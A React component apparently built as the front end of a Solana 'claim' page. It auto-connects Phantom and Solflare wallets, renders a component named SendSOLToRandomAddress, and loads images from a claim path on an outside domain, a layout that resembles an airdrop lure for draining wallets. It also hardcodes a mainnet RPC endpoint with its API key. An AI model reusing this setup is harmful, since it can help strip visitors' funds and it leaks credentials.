import React, { useMemo} from 'react';
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';
import {
    WalletModalProvider,
    WalletConnectButton,

} from '@solana/wallet-adapter-react-ui';
import SendSOLToRandomAddress from './button';
import {  useWallet } from '@solana/wallet-adapter-react';

// Default styles that can be overridden by your app
require('@solana/wallet-adapter-react-ui/styles.css');

export const WalletInt = () => {

    const endpoint = "https://mainnet.helius-rpc.com/?api-key=fda1de7c-cdae-4701-8541-46c76104f840";
    const wallets = useMemo(() => [new PhantomWalletAdapter(), new SolflareWalletAdapter()], []);
    const { connected } = useWallet();
    console.log('Connected status outside useEffect:', connected);


    return (
        <div className="items-center justify-center w-full h-screen flex bg-gradient-to-b from-black to-transparent bg-no-repeat bg-cover bg-center" style={{ backgroundImage: "url(https://solanaexplore.com/claim/bg.jpeg)" }}>
    <div className="flex flex-col items-center justify-center">
        <img alt="smoleup" className="rounded-full w-36" src="https://solanaexplore.com/claim/logo.jpeg" />
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets}>
                <WalletModalProvider>
                    <div className="mt-4 flex flex-col items-center">
                        <WalletConnectButton autoConnect />
                        <SendSOLToRandomAddress />
                    </div>
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    </div>
</div>
    );
};

export default WalletInt;
